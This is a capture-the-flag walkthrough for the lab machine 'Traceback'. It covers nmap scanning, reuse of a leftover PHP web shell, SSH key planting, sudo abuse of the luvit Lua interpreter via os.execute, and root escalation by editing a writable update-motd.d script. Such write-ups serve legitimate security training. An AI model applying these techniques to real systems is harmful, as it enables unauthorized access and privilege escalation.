# Traceback walkthroughs

Machine ip: 10.10.10.181

Running ```nmap``` gave this output:

```
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp    filtered http
55564/tcp filtered unknown
```

Let's start from the website on port 80. The website is actually a page modified by "hackers" who attacked the host and googling a sentence leads to a
repo git containing web shells https://github.com/TheBinitGhimire/Web-Shells.

Well, our shell is smevk.php. Navigate the new url and prepare to use the shell. Default password and username required and they are available in the source code

I cannot get an interactive shell but i could load my ssh key and use port 22 to login as webadmin.


Using the sudo -l command, we can see the special permission we have, which is to run the luvit program as
sysadmin:

```
$ sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
```

Luvit is a program to execute code written in lua, and always in the home there is a key.lua file, containing a
portion of code that allows you to add any public key into the authorized keys of sysadmin.

To execute command through lua you have to use os.execute("you command") so let's go with:

``` $ sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute("cat /home/sysadmin/user.txt")' ```

and get the user flag.

## Root

With the same idea of putting my ssh key to get a stable shell I ssh into the machine as sysadmin and continued enumerating. Thanks to pspy64 i can spot
a process that every time ssh is called execute command as root.

It copies from the backups
folder inside ```etc/update-motd.d```.
If we go into /etc/update-motd.d, we notice that we can edit the files, such as the header. Since it will be
run as root, it will be sufficient to print our flag (you have to be quick because every 30 seconds the file will
be overwritten and therefore our changes will be lost).
Within 00-header, add the following lines of code:
```
FILE="/root/root.txt"
echo "*** File - $FILE contents ***"
cat $FILE
```

Then we can read the root flag and we are done with this machine
